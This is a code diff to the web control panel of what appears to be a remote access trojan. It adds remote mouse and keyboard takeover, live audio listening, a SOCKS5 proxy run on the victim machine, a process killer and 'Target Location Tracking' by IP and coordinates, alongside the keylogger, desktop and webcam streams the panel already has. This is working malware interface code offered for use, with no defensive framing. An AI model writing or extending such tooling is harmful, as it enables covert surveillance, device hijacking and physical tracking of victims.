@@ -77,6 +77,7 @@
             font-weight: 800;
             background: linear-gradient(135deg, var(--accent), #00b4d8);
             -webkit-background-clip: text;
+            background-clip: text;
             -webkit-text-fill-color: transparent;
             letter-spacing: -0.5px;
         }
@@ -655,6 +656,12 @@
                 <button class="tab-btn" data-tab="keys" onclick="switchTab(event, 'keys')">
                     <span class="tab-icon">⌨️</span> Keylogger
                 </button>
+                <button class="tab-btn" data-tab="procs" onclick="switchTab(event, 'procs')">
+                    <span class="tab-icon">📊</span> Processes
+                </button>
+                <button class="tab-btn" data-tab="map" onclick="switchTab(event, 'map')">
+                    <span class="tab-icon">📍</span> Map
+                </button>
             </div>
 
             <!-- LIVE VIEW -->
@@ -686,9 +693,12 @@
                 <div class="action-bar">
                     <button class="action-btn" id="btn-screen" onclick="toggleStream('screen')">🖥️ Toggle Desktop</button>
                     <button class="action-btn" id="btn-webcam" onclick="toggleStream('webcam')">📷 Toggle Webcam</button>
+                    <button class="action-btn" id="btn-control" onclick="toggleControl()">🎮 Enable Control</button>
+                    <button class="action-btn" id="btn-fullscreen" onclick="toggleFullscreen()">🔲 Fullscreen</button>
+                    <button class="action-btn" id="btn-audio" onclick="toggleStream('audio')">🎤 Listen Audio</button>
+                    <button class="action-btn" id="btn-socks" onclick="toggleStream('socks5')">🔗 Start SOCKS5</button>
                     <button class="action-btn" onclick="takeScreenshot()">📸 Screenshot</button>
                     <button class="action-btn" onclick="sysInfo()">ℹ️ System Info</button>
-                    <button class="action-btn" onclick="recordAudio()">🎤 Record Audio</button>
                 </div>
             </div>
 
@@ -746,6 +756,51 @@
                     <div class="keylog-output" id="keylog-output">Waiting for keystrokes...</div>
                 </div>
             </div>
+
+            <!-- PROCESSES -->
+            <div id="procs" class="tab-content">
+                <div class="terminal-container">
+                    <div class="terminal-header">
+                        <h4>📊 Process Manager</h4>
+                        <button class="action-btn" style="padding:0.3rem 0.8rem; font-size:0.7rem;" onclick="getProcesses()">Refresh</button>
+                    </div>
+                    <div style="padding: 1rem; overflow-x: auto;">
+                        <table style="width: 100%; border-collapse: collapse; font-size: 0.85rem;">
+                            <thead>
+                                <tr style="border-bottom: 1px solid var(--border); color: var(--text-muted); text-align: left;">
+                                    <th style="padding: 0.5rem;">PID</th>
+                                    <th style="padding: 0.5rem;">Name</th>
+                                    <th style="padding: 0.5rem;">CPU %</th>
+                                    <th style="padding: 0.5rem;">MEM (MB)</th>
+                                    <th style="padding: 0.5rem;">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="process-list-body">
+                                <tr><td colspan="5" style="text-align:center; padding: 2rem; color: var(--text-muted);">Click Refresh to fetch processes</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- MAP / GEO-IP -->
+            <div id="map" class="tab-content">
+                <div class="stream-grid">
+                    <div class="stream-box" style="grid-column: span 2;">
+                        <div class="stream-header">
+                            <h4>🌍 Target Location Tracking</h4>
+                            <button class="action-btn" style="padding: 0.3rem 0.8rem; font-size: 0.7rem;" onclick="fetchLocation()">Update Location</button>
+                        </div>
+                        <div id="location-info" style="padding: 2rem; display: flex; gap: 2rem; align-items: center;">
+                            <div style="font-size: 3rem;">📍</div>
+                            <div>
+                                <h1 id="loc-city-country" style="margin-bottom: 0.5rem; color: var(--accent);">Waiting for data...</h1>
+                                <p id="loc-details" style="color: var(--text-muted); line-height: 1.6;"></p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -755,6 +810,84 @@
         let selectedClient = null;
         let screenActive = false;
         let webcamActive = false;
+        let isControlEnabled = false;
+
+        /* ===== REMOTE CONTROL LOGIC ===== */
+        const screenCanvas = document.getElementById('screen-canvas');
+
+        function toggleControl() {
+            if (!requireClient()) return;
+            isControlEnabled = !isControlEnabled;
+            const btn = document.getElementById('btn-control');
+            btn.classList.toggle('active', isControlEnabled);
+            btn.innerHTML = isControlEnabled ? '🎮 Disable Control' : '🎮 Enable Control';
+            showToast(`Remote control ${isControlEnabled ? 'ENABLED' : 'DISABLED'}`, isControlEnabled ? 'success' : 'info');
+            
+            if (isControlEnabled) {
+                screenCanvas.style.cursor = 'none'; // Hide local cursor over stream
+            } else {
+                screenCanvas.style.cursor = 'default';
+            }
+        }
+
+        function toggleFullscreen() {
+            const container = screenCanvas.parentElement;
+            if (!document.fullscreenElement) {
+                container.requestFullscreen().catch(err => {
+                    showToast(`Fullscreen error: ${err.message}`, 'error');
+                });
+            } else {
+                document.exitFullscreen();
+            }
+        }
+
+        // Mouse Events
+        screenCanvas.addEventListener('mousemove', (e) => {
+            if (!isControlEnabled || !selectedClient) return;
+            const rect = screenCanvas.getBoundingClientRect();
+            const x = (e.clientX - rect.left) / rect.width;
+            const y = (e.clientY - rect.top) / rect.height;
+            socket.emit('mouse_move', { client_id: selectedClient, x: x, y: y });
+        });
+
+        screenCanvas.addEventListener('mousedown', (e) => {
+            if (!isControlEnabled || !selectedClient) return;
+            const buttons = ['left', 'middle', 'right'];
+            socket.emit('mouse_click', { client_id: selectedClient, btn: buttons[e.button], action: 'down' });
+        });
+
+        screenCanvas.addEventListener('mouseup', (e) => {
+            if (!isControlEnabled || !selectedClient) return;
+            const buttons = ['left', 'middle', 'right'];
+            socket.emit('mouse_click', { client_id: selectedClient, btn: buttons[e.button], action: 'up' });
+        });
+
+        screenCanvas.addEventListener('contextmenu', (e) => {
+            if (isControlEnabled) e.preventDefault();
+        });
+
+        screenCanvas.addEventListener('wheel', (e) => {
+            if (!isControlEnabled || !selectedClient) return;
+            socket.emit('scroll', { client_id: selectedClient, delta: e.deltaY * -1 });
+            e.preventDefault();
+        }, { passive: false });
+
+        // Keyboard Events
+        window.addEventListener('keydown', (e) => {
+            if (!isControlEnabled || !selectedClient) return;
+            // Prevent some browser shortcuts
+            if (['F5', 'F12', 'F11'].includes(e.key)) return;
+            
+            socket.emit('key_press', { client_id: selectedClient, key: e.key.toLowerCase(), action: 'down' });
+            if (e.target === document.body || e.target === screenCanvas) {
+                e.preventDefault();
+            }
+        });
+
+        window.addEventListener('keyup', (e) => {
+            if (!isControlEnabled || !selectedClient) return;
+            socket.emit('key_press', { client_id: selectedClient, key: e.key.toLowerCase(), action: 'up' });
+        });
 
         /* ===== TOAST SYSTEM ===== */
         function showToast(message, type = 'info') {
@@ -811,6 +944,12 @@
                 const el = document.getElementById('keylog-output');
                 el.textContent += data.keys;
                 el.scrollTop = el.scrollHeight;
+            }
+        });
+
+        socket.on('process_list', (data) => {
+            if (selectedClient && data.client_id === selectedClient) {
+                renderProcesses(data.processes);
             }
         });
 
@@ -906,9 +1045,12 @@
             const ctx = canvas.getContext('2d');
             const img = new Image();
             img.onload = () => {
-                canvas.width = canvas.clientWidth;
-                canvas.height = canvas.clientHeight;
-                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                // Resize canvas only if needed
+                if (canvas.width !== img.width || canvas.height !== img.height) {
+                    canvas.width = img.width;
+                    canvas.height = img.height;
+                }
+                ctx.drawImage(img, 0, 0);
             };
             img.src = 'data:image/jpeg;base64,' + b64image;
         }
@@ -1001,6 +1143,52 @@
             if (!requireClient()) return;
             socket.emit('toggle_stream', { client_id: selectedClient, stream_type: 'keylog', enabled: true });
             showToast('Keylog refresh requested', 'info');
+        }
+
+        /* ===== PHASE 4 NEW ACTIONS ===== */
+        function getProcesses() {
+            if (!requireClient()) return;
+            socket.emit('get_processes', { client_id: selectedClient });
+            showToast('Process list requested', 'info');
+        }
+
+        function renderProcesses(processes) {
+            const body = document.getElementById('process-list-body');
+            body.innerHTML = processes.map(p => `
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.03);">
+                    <td style="padding: 0.6rem; color: var(--text-muted);">${p.pid}</td>
+                    <td style="padding: 0.6rem; font-weight: 500;">${p.name}</td>
+                    <td style="padding: 0.6rem; color: var(--accent);">${p.cpu.toFixed(1)}%</td>
+                    <td style="padding: 0.6rem; color: var(--info);">${p.mem.toFixed(1)}</td>
+                    <td style="padding: 0.6rem;">
+                        <button class="action-btn danger" style="padding: 0.2rem 0.5rem; font-size: 0.65rem;" 
+                                onclick="killProcess(${p.pid})">KILL</button>
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        function killProcess(pid) {
+            if (!confirm(`Are you sure you want to terminate PID ${pid}?`)) return;
+            socket.emit('kill_process', { client_id: selectedClient, pid: pid });
+            showToast(`Termination command sent for ${pid}`, 'warning');
+        }
+
+        function fetchLocation() {
+            if (!requireClient()) return;
+            fetch(`/api/clients/${selectedClient}/location`)
+                .then(r => r.json())
+                .then(data => {
+                    const title = document.getElementById('loc-city-country');
+                    title.textContent = `${data.city || 'Unknown'}, ${data.country || 'Unknown'}`;
+                    document.getElementById('loc-details').innerHTML = `
+                        IP Address: <b>${data.query || 'N/A'}</b><br>
+                        ISP: <b>${data.isp || 'N/A'}</b><br>
+                        Lat/Lon: <b>${data.lat || '0'}, ${data.lon || '0'}</b><br>
+                        Timezone: <b>${data.timezone || 'N/A'}</b>
+                    `;
+                    showToast('Location updated', 'success');
+                });
         }
 
         /* ===== PERIODIC REFRESH ===== */
